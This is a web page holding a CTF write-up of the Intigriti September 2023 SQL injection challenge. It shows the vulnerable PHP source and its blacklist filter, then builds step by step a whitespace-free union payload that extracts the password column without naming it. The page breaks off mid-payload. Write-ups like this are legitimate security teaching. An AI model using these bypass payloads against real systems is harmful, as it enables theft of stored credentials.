<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=generator content="Wowchemy 5.7.0 for Hugo"><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap" media=print onload='this.media="all"'><link rel=stylesheet href=/css/vendor-bundle.min.16f785cdb553c8c4431db6775122af35.css media=print onload='this.media="all"'><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/academicons@1.9.2/css/academicons.min.css integrity="sha512-KlJCpRsLf+KKu2VQa5vmRuClRFjxc5lXO03ixZt82HZUk41+1I0bD8KBSA0fY290ayMfWYI9udIqeOWSu1/uZg==" crossorigin=anonymous media=print onload='this.media="all"'><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/leaflet@1.7.1/dist/leaflet.min.css integrity crossorigin=anonymous media=print onload='this.media="all"'><link rel=stylesheet href=/css/wowchemy.79e51de7c4464db8eb07f9e30f7461b3.css><link rel=stylesheet href=/css/libs/chroma/igor.min.css title=hl-light media=print onload='this.media="all"'><link rel=stylesheet href=/css/libs/chroma/dracula.min.css title=hl-dark media=print onload='this.media="all"' disabled><meta name=author content="BKISC"><meta name=description content="SQL injection filter bypass, with no spaces and without calling column name."><link rel=alternate hreflang=en-us href=https://blog.bkisc.com/blog/hoangdayne/intigrity-monthly-0923/><link rel=canonical href=https://blog.bkisc.com/blog/hoangdayne/intigrity-monthly-0923/><link rel=manifest href=/manifest.webmanifest><link rel=icon type=image/png href=/media/icon_hu606891fec664e3336fdbe668a4668404_488824_32x32_fill_lanczos_center_3.png><link rel=apple-touch-icon type=image/png href=/media/icon_hu606891fec664e3336fdbe668a4668404_488824_180x180_fill_lanczos_center_3.png><meta name=theme-color content="#1565c0"><meta property="twitter:card" content="summary_large_image"><meta property="twitter:site" content="@bkisc"><meta property="twitter:creator" content="@bkisc"><meta property="twitter:image" content="https://blog.bkisc.com/blog/hoangdayne/intigrity-monthly-0923/featured.jpg"><meta property="og:site_name" content="BKISC Blogs"><meta property="og:url" content="https://blog.bkisc.com/blog/hoangdayne/intigrity-monthly-0923/"><meta property="og:title" content="Writeup for Intigriti September Challenge 2023 | BKISC Blogs"><meta property="og:description" content="SQL injection filter bypass, with no spaces and without calling column name."><meta property="og:image" content="https://blog.bkisc.com/blog/hoangdayne/intigrity-monthly-0923/featured.jpg"><meta property="og:locale" content="en-us"><meta property="article:published_time" content="2022-10-03T11:59:00+00:00"><meta property="article:modified_time" content="2023-09-26T00:00:00+00:00"><title>Writeup for Intigriti September Challenge 2023 | BKISC Blogs</title><script>MathJax={tex:{inlineMath:[["$","$"],["\\(","\\)"]],displayMath:[["$$","$$"],["\\[","\\]"]],processEscapes:!0,processEnvironments:!0},options:{skipHtmlTags:["script","noscript","style","textarea","pre","flag"]}},window.addEventListener("load",e=>{document.querySelectorAll("mjx-container").forEach(function(e){e.parentElement.classList+="has-jax"})})</script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script type=text/javascript id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script></head><body id=top data-spy=scroll data-offset=70 data-target=#TableOfContents class=page-wrapper data-wc-page-id=2a1a237be43f4b8f1da26f427e2d7a9d><script src=/js/wowchemy-init.min.ec9d49ca50e4b80bdb08f0417a28ed84.js></script><aside class=search-modal id=search><div class=container><section class=search-header><div class="row no-gutters justify-content-between mb-3"><div class=col-6><h1>Search</h1></div><div class="col-6 col-search-close"><a class=js-search href=# aria-label=Close><i class="fas fa-times-circle text-muted" aria-hidden=true></i></a></div></div><div id=search-box><input name=q id=search-query placeholder=Search... autocapitalize=off autocomplete=off autocorrect=off spellcheck=false type=search class=form-control aria-label=Search...></div></section><section class=section-search-results><div id=search-hits></div></section></div></aside><div class="page-header header--fixed"><header><nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id=navbar-main><div class=container-xl><div class="d-none d-lg-inline-flex"><a class=navbar-brand href=/><img src=/media/logo_huc55a0313517dd04bda48a4ace4db28bc_511389_0x70_resize_lanczos_3.png alt="BKISC Blogs"></a></div><button type=button class=navbar-toggler data-toggle=collapse data-target=#navbar-content aria-controls=navbar-content aria-expanded=false aria-label="Toggle navigation">
<span><i class="fas fa-bars"></i></span></button><div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none"><a class=navbar-brand href=/><img src=/media/logo_huc55a0313517dd04bda48a4ace4db28bc_511389_0x70_resize_lanczos_3.png alt="BKISC Blogs"></a></div><div class="navbar-collapse main-menu-item collapse justify-content-center" id=navbar-content><ul class="navbar-nav d-md-inline-flex"><li class=nav-item><a class=nav-link href=/><span>Home</span></a></li><li class=nav-item><a class=nav-link href=/introduction><span>Introduction</span></a></li><li class=nav-item><a class=nav-link href=/post><span>News</span></a></li><li class=nav-item><a class=nav-link href=/event><span>Events</span></a></li><li class=nav-item><a class="nav-link active" href=/blog><span>Blogs</span></a></li><li class=nav-item><a class=nav-link href=/members><span>Members</span></a></li><li class=nav-item><a class=nav-link href=/contact><span>Contact</span></a></li></ul></div><ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2"><li class=nav-item><a class="nav-link js-search" href=# aria-label=Search><i class="fas fa-search" aria-hidden=true></i></a></li><li class="nav-item dropdown theme-dropdown"><a href=# class=nav-link data-toggle=dropdown aria-haspopup=true aria-label="Display preferences"><i class="fas fa-moon" aria-hidden=true></i></a><div class=dropdown-menu><a href=# class="dropdown-item js-set-theme-light"><span>Light</span></a>
<a href=# class="dropdown-item js-set-theme-dark"><span>Dark</span></a>
<a href=# class="dropdown-item js-set-theme-auto"><span>Automatic</span></a></div></li></ul></div></nav></header></div><div class=page-body><article class=article><div class="article-container pt-3"><h1>Writeup for Intigriti September Challenge 2023</h1><div class=article-metadata><div><span><a href=/author/le-hoang/>L√™ Ho√†ng</a></span></div><span class=article-date>Sep 26, 2023</span></div><div class="btn-links mb-3"></div></div><div class="article-header article-container featured-image-wrapper mt-4 mb-4" style=max-width:680px;max-height:383px><div style=position:relative><img src=/blog/hoangdayne/intigrity-monthly-0923/featured_hu7a832f7d52e958f035cf71ee29df1717_30754_720x2500_fit_q75_h2_lanczos.webp width=680 height=383 alt class=featured-image>
<span class=article-header-caption>Source: <a href=https://twitter.com/intigriti/status/1706302419640979819 target=_blank rel=noopener><strong>Intigriti</strong></a></span></div></div><div class=article-container><div class=article-style><p><ul class=tags-list><a href=https://blog.bkisc.com/tag/writeup/>writeup</a>
<a href=https://blog.bkisc.com/tag/web-exploitation/>web-exploitation</a></ul><details class="toc-inpage d-print-none" open><summary class=font-weight-bold>Table of Contents</summary><nav id=TableOfContents><ul><li><a href=#statement>Statement</a></li><li><a href=#overview>Overview</a><ul><li><a href=#first-glance>First glance</a></li><li><a href=#filter>Filter</a></li></ul></li><li><a href=#filter-bypass>Filter bypass</a><ul><li><a href=#number-check>Number Check</a></li><li><a href=#no-whitespaces>No whitespaces</a></li><li><a href=#desired-characters-are-blocked>Desired characters are blocked</a></li></ul></li><li><a href=#constructing-payload>Constructing payload</a><ul><li><a href=#our-union-select>Our union select</a></li><li><a href=#without-using-a-column-name>Without using a column name</a></li><li><a href=#combine-with-no-spaces-using-parentheses>Combine with no spaces using parentheses</a></li><li><a href=#try-it-out>Try it out</a></li><li><a href=#final-touch>Final touch</a></li></ul></li><li><a href=#put-it-all-together>Put it all together</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></details></p><p>Hi all, first time doing a writeup here üòâ. This will be the <a href=https://challenge-0923.intigriti.io/ target=_blank rel=noopener>Intigriti September 2023 challenge</a> created by
<mark>@sgrum0x</mark>. I wrote this writeup not just for experienced players but also for newbies. In short, this challenge can be solved by using parentheses for whitespaces filter and get a column without using its name.</p><p><figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/hoangdayne/intigrity-monthly-0923/bypass_meme_hu9ad0eb4d2749443f9a854633f0bc7965_91548_517ebc975a1821bd3a1cb662ab1b5ba9.webp 400w,
/blog/hoangdayne/intigrity-monthly-0923/bypass_meme_hu9ad0eb4d2749443f9a854633f0bc7965_91548_0453d0f0c82c658e180d73256ebcfc56.webp 760w,
/blog/hoangdayne/intigrity-monthly-0923/bypass_meme_hu9ad0eb4d2749443f9a854633f0bc7965_91548_1200x1200_fit_q75_h2_lanczos.webp 1200w" src=/blog/hoangdayne/intigrity-monthly-0923/bypass_meme_hu9ad0eb4d2749443f9a854633f0bc7965_91548_517ebc975a1821bd3a1cb662ab1b5ba9.webp width=500 height=500 loading=lazy data-zoomable></div></div></figure></p><h2 id=statement>Statement</h2><p>Featuring this month&rsquo;s challenge will be an SQL injection challenge. At first glance, it is a table containing ID, username, email of some users.</p><p><figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/hoangdayne/intigrity-monthly-0923/first_look_hu95e27a4b34b6ee2569d8350495e1345d_41974_0a0f2dcafd80b57f58f9560a00be787d.webp 400w,
/blog/hoangdayne/intigrity-monthly-0923/first_look_hu95e27a4b34b6ee2569d8350495e1345d_41974_4417b0cf4fc607aa7079f93df60915e7.webp 760w,
/blog/hoangdayne/intigrity-monthly-0923/first_look_hu95e27a4b34b6ee2569d8350495e1345d_41974_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/hoangdayne/intigrity-monthly-0923/first_look_hu95e27a4b34b6ee2569d8350495e1345d_41974_0a0f2dcafd80b57f58f9560a00be787d.webp width=760 height=352 loading=lazy data-zoomable></div></div></figure></p><p>There is also a
<mark>Show Source</mark> button. Upon clicking it, we can have a look at the source code of the challenge.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=ln> 1</span><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=ln> 2</span><span class=cl><span class=nv>$max</span> <span class=o>=</span> <span class=mi>10</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 3</span><span class=cl>
</span></span><span class=line><span class=ln> 4</span><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;max&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;max&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;max&#39;</span><span class=p>]</span><span class=o>&gt;</span><span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 5</span><span class=cl>    <span class=nv>$max</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;max&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=ln> 6</span><span class=cl>    <span class=nv>$words</span>  <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;&#39;&#34;</span><span class=p>,</span><span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;;&#34;</span><span class=p>,</span><span class=s2>&#34;`&#34;</span><span class=p>,</span><span class=s2>&#34; &#34;</span><span class=p>,</span><span class=s2>&#34;a&#34;</span><span class=p>,</span><span class=s2>&#34;b&#34;</span><span class=p>,</span><span class=s2>&#34;h&#34;</span><span class=p>,</span><span class=s2>&#34;k&#34;</span><span class=p>,</span><span class=s2>&#34;p&#34;</span><span class=p>,</span><span class=s2>&#34;v&#34;</span><span class=p>,</span><span class=s2>&#34;x&#34;</span><span class=p>,</span><span class=s2>&#34;or&#34;</span><span class=p>,</span><span class=s2>&#34;if&#34;</span><span class=p>,</span><span class=s2>&#34;case&#34;</span><span class=p>,</span><span class=s2>&#34;in&#34;</span><span class=p>,</span><span class=s2>&#34;between&#34;</span><span class=p>,</span><span class=s2>&#34;join&#34;</span><span class=p>,</span><span class=s2>&#34;json&#34;</span><span class=p>,</span><span class=s2>&#34;set&#34;</span><span class=p>,</span><span class=s2>&#34;=&#34;</span><span class=p>,</span><span class=s2>&#34;|&#34;</span><span class=p>,</span><span class=s2>&#34;&amp;&#34;</span><span class=p>,</span><span class=s2>&#34;%&#34;</span><span class=p>,</span><span class=s2>&#34;+&#34;</span><span class=p>,</span><span class=s2>&#34;-&#34;</span><span class=p>,</span><span class=s2>&#34;&lt;&#34;</span><span class=p>,</span><span class=s2>&#34;&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;#&#34;</span><span class=p>,</span><span class=s2>&#34;/&#34;</span><span class=p>,</span><span class=s2>&#34;</span><span class=se>\r</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;</span><span class=se>\t</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;\v&#34;</span><span class=p>,</span><span class=s2>&#34;\f&#34;</span><span class=p>];</span> <span class=c1>// list of characters to check
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=c1></span>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$words</span> <span class=k>as</span> <span class=nv>$w</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 8</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;#&#34;</span><span class=o>.</span><span class=nx>preg_quote</span><span class=p>(</span><span class=nv>$w</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;#i&#34;</span><span class=p>,</span> <span class=nv>$max</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl>            <span class=k>exit</span><span class=p>(</span><span class=s2>&#34;H4ckerzzzz&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>        <span class=p>}</span> <span class=c1>//no weird chars
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=c1></span>    <span class=p>}</span>       
</span></span><span class=line><span class=ln>12</span><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=ln>13</span><span class=cl>
</span></span><span class=line><span class=ln>14</span><span class=cl><span class=k>try</span><span class=p>{</span>
</span></span><span class=line><span class=ln>15</span><span class=cl>  <span class=c1>//seen in production
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=c1></span>  <span class=nv>$stmt</span> <span class=o>=</span> <span class=nv>$pdo</span><span class=o>-&gt;</span><span class=na>prepare</span><span class=p>(</span><span class=s2>&#34;SELECT id, name, email FROM users WHERE id&lt;=</span><span class=si>$max</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>17</span><span class=cl>  <span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>execute</span><span class=p>();</span>
</span></span><span class=line><span class=ln>18</span><span class=cl>  <span class=nv>$results</span> <span class=o>=</span> <span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>fetchAll</span><span class=p>();</span>
</span></span><span class=line><span class=ln>19</span><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=ln>20</span><span class=cl><span class=k>catch</span><span class=p>(</span><span class=nx>\PDOException</span> <span class=nv>$e</span><span class=p>){</span>
</span></span><span class=line><span class=ln>21</span><span class=cl>  <span class=k>exit</span><span class=p>(</span><span class=s2>&#34;ERROR: BROKEN QUERY&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>22</span><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=ln>23</span><span class=cl>    <span class=cm>/* FYI
</span></span></span><span class=line><span class=ln>24</span><span class=cl><span class=cm>    CREATE TABLE users (
</span></span></span><span class=line><span class=ln>25</span><span class=cl><span class=cm>        id INT AUTO_INCREMENT PRIMARY KEY,
</span></span></span><span class=line><span class=ln>26</span><span class=cl><span class=cm>        name VARCHAR(255) NOT NULL,
</span></span></span><span class=line><span class=ln>27</span><span class=cl><span class=cm>        email VARCHAR(255) UNIQUE NOT NULL,
</span></span></span><span class=line><span class=ln>28</span><span class=cl><span class=cm>        password VARCHAR(255) NOT NULL
</span></span></span><span class=line><span class=ln>29</span><span class=cl><span class=cm>    );
</span></span></span><span class=line><span class=ln>30</span><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=ln>31</span><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=ln>32</span><span class=cl><span class=err>...
</span></span></span><span class=line><span class=ln>33</span><span class=cl><span class=err>&lt;td&gt;&lt;?= htmlspecialchars(strpos($row[&#39;id&#39;],&#34;INTIGRITI&#34;)===false?$row[&#39;id&#39;]:&#34;REDACTED&#34;); ?&gt;&lt;/td&gt; 
</span></span></span><span class=line><span class=ln>34</span><span class=cl><span class=err>&lt;td&gt;&lt;?= htmlspecialchars(strpos($row[&#39;name&#39;],&#34;INTIGRITI&#34;)===false?$row[&#39;name&#39;]:&#34;REDACTED&#34;); ?&gt;&lt;/td&gt;
</span></span></span><span class=line><span class=ln>35</span><span class=cl><span class=err>&lt;td&gt;&lt;?= htmlspecialchars(strpos($row[&#39;email&#39;],&#34;INTIGRITI&#34;)===false?$row[&#39;email&#39;]:&#34;REDACTED&#34;); ?&gt;&lt;/td&gt; 
</span></span></span><span class=line><span class=ln>36</span><span class=cl><span class=err>...
</span></span></span></code></pre></div><p>Upon reading the source code, I was able to guess that the flag will be in the column <code>password</code> which we need to leak it somehow using `SQL Injection``. So where is the injection point? What are the problems that we need to encounter? Let&rsquo;s dive deeper.</p><h2 id=overview>Overview</h2><h3 id=first-glance>First glance</h3><p>Upon reviewing the source code, we can easily find the SQL Injection endpoint.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=ln>1</span><span class=cl><span class=nv>$max</span> <span class=o>=</span> <span class=mi>10</span><span class=p>;</span>
</span></span><span class=line><span class=ln>2</span><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=ln>3</span><span class=cl><span class=nv>$max</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;max&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=ln>4</span><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=ln>5</span><span class=cl><span class=nv>$stmt</span> <span class=o>=</span> <span class=nv>$pdo</span><span class=o>-&gt;</span><span class=na>prepare</span><span class=p>(</span><span class=s2>&#34;SELECT id, name, email FROM users WHERE id&lt;=</span><span class=si>$max</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span></code></pre></div><p>But it wouldn&rsquo;t have been a challenge if it was this easy right ü•≤?
The variable <code>$max</code> must go through a god d@mn filter to be passed to the query.</p><h3 id=filter>Filter</h3><p>Let&rsquo;s take a look at the filter:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=ln>1</span><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;max&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;max&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;max&#39;</span><span class=p>]</span><span class=o>&gt;</span><span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>2</span><span class=cl>    <span class=nv>$max</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;max&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=ln>3</span><span class=cl>    <span class=nv>$words</span>  <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;&#39;&#34;</span><span class=p>,</span><span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;;&#34;</span><span class=p>,</span><span class=s2>&#34;`&#34;</span><span class=p>,</span><span class=s2>&#34; &#34;</span><span class=p>,</span><span class=s2>&#34;a&#34;</span><span class=p>,</span><span class=s2>&#34;b&#34;</span><span class=p>,</span><span class=s2>&#34;h&#34;</span><span class=p>,</span><span class=s2>&#34;k&#34;</span><span class=p>,</span><span class=s2>&#34;p&#34;</span><span class=p>,</span><span class=s2>&#34;v&#34;</span><span class=p>,</span><span class=s2>&#34;x&#34;</span><span class=p>,</span><span class=s2>&#34;or&#34;</span><span class=p>,</span><span class=s2>&#34;if&#34;</span><span class=p>,</span><span class=s2>&#34;case&#34;</span><span class=p>,</span><span class=s2>&#34;in&#34;</span><span class=p>,</span><span class=s2>&#34;between&#34;</span><span class=p>,</span><span class=s2>&#34;join&#34;</span><span class=p>,</span><span class=s2>&#34;json&#34;</span><span class=p>,</span><span class=s2>&#34;set&#34;</span><span class=p>,</span><span class=s2>&#34;=&#34;</span><span class=p>,</span><span class=s2>&#34;|&#34;</span><span class=p>,</span><span class=s2>&#34;&amp;&#34;</span><span class=p>,</span><span class=s2>&#34;%&#34;</span><span class=p>,</span><span class=s2>&#34;+&#34;</span><span class=p>,</span><span class=s2>&#34;-&#34;</span><span class=p>,</span><span class=s2>&#34;&lt;&#34;</span><span class=p>,</span><span class=s2>&#34;&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;#&#34;</span><span class=p>,</span><span class=s2>&#34;/&#34;</span><span class=p>,</span><span class=s2>&#34;</span><span class=se>\r</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;</span><span class=se>\t</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;\v&#34;</span><span class=p>,</span><span class=s2>&#34;\f&#34;</span><span class=p>];</span> <span class=c1>// list of characters to check
</span></span></span><span class=line><span class=ln>4</span><span class=cl><span class=c1></span>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$words</span> <span class=k>as</span> <span class=nv>$w</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>5</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;#&#34;</span><span class=o>.</span><span class=nx>preg_quote</span><span class=p>(</span><span class=nv>$w</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;#i&#34;</span><span class=p>,</span> <span class=nv>$max</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>6</span><span class=cl>            <span class=k>exit</span><span class=p>(</span><span class=s2>&#34;H4ckerzzzz&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>7</span><span class=cl>        <span class=p>}</span> <span class=c1>//no weird chars
</span></span></span><span class=line><span class=ln>8</span><span class=cl><span class=c1></span>    <span class=p>}</span>       
</span></span><span class=line><span class=ln>9</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>In short, there are 2 processes the filter performs:</p><ul><li>First, it checks the query <code>$_GET['max']</code> if it is an array and greater than 0.</li><li>If it satisfies the condition, it assigns <code>$max</code> with the query <code>$_GET['max']</code>, and then it performs a blacklist case insensitive check.</li></ul><h2 id=filter-bypass>Filter bypass</h2><h3 id=number-check>Number Check</h3><p>First up, in order to get through the if statement, the max must greater than 0. This is easy as stated in <strong>PHP Documentation</strong>.<figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/hoangdayne/intigrity-monthly-0923/php_number_hu005304ac442cc80a4219bdcbd84e7ef8_50787_9ec9e8939939cd0517cb0dc1179c1343.webp 400w,
/blog/hoangdayne/intigrity-monthly-0923/php_number_hu005304ac442cc80a4219bdcbd84e7ef8_50787_9b6a089a64d7a731c554742732167189.webp 760w,
/blog/hoangdayne/intigrity-monthly-0923/php_number_hu005304ac442cc80a4219bdcbd84e7ef8_50787_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/hoangdayne/intigrity-monthly-0923/php_number_hu005304ac442cc80a4219bdcbd84e7ef8_50787_9ec9e8939939cd0517cb0dc1179c1343.webp width=760 height=497 loading=lazy data-zoomable></div></div></figure>So we only need a <strong>number > 0</strong> at the <strong>first character</strong> of the payload, we&rsquo;re good to move on.</p><h3 id=no-whitespaces>No whitespaces</h3><p>Any payloads that contain white space or newline characters are filtered.</p><p>Comments for whitespaces will fail as it blocks character <code>/</code>.</p><p>There are a few payloads with alternative characters, unicodes that I have tried and failed like: <code>%a0, %09, %0a, ...</code></p><p>There are still other ways.</p><p>Taking this from <a href=https://book.hacktricks.xyz/pentesting-web/sql-injection#no-spaces-bypass target=_blank rel=noopener>Hacktricks</a>, we may already find the payload we need:
<code>?max=(1)and(1)=(1)</code>.</p><p>Niceüëå.</p><p>However, if you apply this right away it would not work as it requires a <strong>leading numeric character</strong> in the payload. We can use arithmetic operators to utilize this.</p><p>Operator <code>*</code> multiply is not filtered. <code>?max=1*(2)and(1)=(1)</code></p><h3 id=desired-characters-are-blocked>Desired characters are blocked</h3><p>We can already construct a payload for <strong>Union-Based</strong> SQL Injection.</p><p>The payload for it may be: <code>1 union select 1,2,password from users</code></p><p>Bad news: <code>"password"</code> has character a &ldquo;a&rdquo; which is filtered.</p><p>Good news: <a href=https://book.hacktricks.xyz/pentesting-web/sql-injection#bypass-column-names-restriction target=_blank rel=noopener>Hacktricks</a> also offers us another way around.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>-- This is an example with 3 columns that will extract the column number 3
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>-</span><span class=mi>1</span><span class=w> </span><span class=k>UNION</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=n>F</span><span class=p>.</span><span class=mi>3</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=p>(</span><span class=k>SELECT</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>3</span><span class=w> </span><span class=k>UNION</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>demo</span><span class=p>)</span><span class=n>F</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><h2 id=constructing-payload>Constructing payload</h2><h3 id=our-union-select>Our union select</h3><p>Let&rsquo;s start with making our union select, provided that there are no filters applied.</p><p>It would be:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=o>*</span><span class=mi>2</span><span class=w> </span><span class=k>UNION</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w>
</span></span></span></code></pre></div><h3 id=without-using-a-column-name>Without using a column name</h3><p>Column <code>"password"</code> is the fourth column of the table users. So the payload from the previous section would be:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=o>*</span><span class=mi>2</span><span class=w> </span><span class=k>UNION</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=n>F</span><span class=p>.</span><span class=mi>4</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=p>(</span><span class=k>SELECT</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>3</span><span class=p>,</span><span class=w> </span><span class=mi>4</span><span class=w> </span><span class=k>UNION</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=p>)</span><span class=n>F</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Extracting the fourth column with a table with 4 columns
</span></span></span></code></pre></div><h3 id=combine-with-no-spaces-using-parentheses>Combine with no spaces using parentheses</h3><p>This is a tedious and annoying part to explain so I just leave it right here for you to think about and try:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=o>*</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span><span class=k>union</span><span class=p>(</span><span class=k>SELECT</span><span class=p>(</span><span class=mi>1</span><span class=p>),(</span><span class=mi>2</span><span class=p>),((</span><span class=n>F</span><span class=p>.</span><span class=mi>4</span><span class=p>))</span><span class=k>from</span><span class=p>(</span><span class=k>SELECT</span><span class=p>(</span><span class=mi>1</span><span class=p>),(</span><span class=mi>2</span><span class=p>),(</span><span class=mi>3</span><span class=p>),(</span><span class=mi>4</span><span class=p>)</span><span class=k>union</span><span class=p>(</span><span class=k>SELECT</span><span class=o>*</span><span class=k>from</span><span class=p>(</span><span class=n>users</span><span class=p>)))</span><span class=n>F</span><span class=p>)</span><span class=w>
